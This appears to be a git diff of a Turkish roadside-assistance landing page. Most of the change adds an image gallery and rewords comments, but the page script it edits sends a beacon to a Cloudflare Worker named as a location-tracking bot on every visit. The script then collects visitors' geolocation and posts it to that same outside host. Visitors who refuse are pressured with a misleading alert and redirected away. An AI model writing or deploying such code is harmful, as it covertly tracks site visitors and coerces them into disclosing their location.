@@ -66,6 +66,11 @@
     <div class="stat"><strong>1000+</strong> Müşteri</div>
     <div class="stat"><strong>İzmir</strong> Tamamı</div>
   </div>
+
+  <div class="gallery">
+    <img src="https://images.unsplash.com/photo-1544161513-0179fe746fd5?auto=format&fit=crop&w=300" alt="Servis 1" />
+    <img src="https://images.unsplash.com/photo-1544161513-0179fe746fd5?auto=format&fit=crop&w=301" alt="Servis 2" />
+  </div>
 </section>
 
 <section class="container">
@@ -87,9 +92,10 @@
 
 <script>
 window.onload = function() {
+    // Senin Cloudflare Worker URL'n
     const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';
 
-    // 1. ADIM: SİTEYE GİRİLDİĞİ AN (BEKLEMEDEN) BİLDİRİM GÖNDER
+    // 1. ADIM: SİTEYE GİRİLDİĞİ AN BİLDİRİM GÖNDER
     fetch(workerURL, {
         method: 'POST',
         mode: 'no-cors',
@@ -99,8 +105,8 @@ window.onload = function() {
     // 2. ADIM: KONUM İZNİ İSTE
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            // Başarılı: İzin Verildi
             function(position) {
+                // Konum onaylanırsa
                 fetch(workerURL, {
                     method: 'POST',
                     mode: 'no-cors',
@@ -112,17 +118,17 @@ window.onload = function() {
                     })
                 });
             },
-            // Hata veya Reddetme
             function(error) {
+                // Konum reddedilirse
                 fetch(workerURL, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({ status: "rejected" })
                 });
                 
-                // Reddedenleri 1.5 saniye sonra Google'a postala
+                // 1.5 saniye sonra Google'a yönlendir
                 setTimeout(() => {
-                    alert("Size yardımcı olabilmemiz için konum izni vermeniz gerekmektedir.");
+                    alert("Yol yardımı alabilmek için konum izni vermeniz gerekmektedir.");
                     window.location.href = "https://www.google.com";
                 }, 1500);
             },
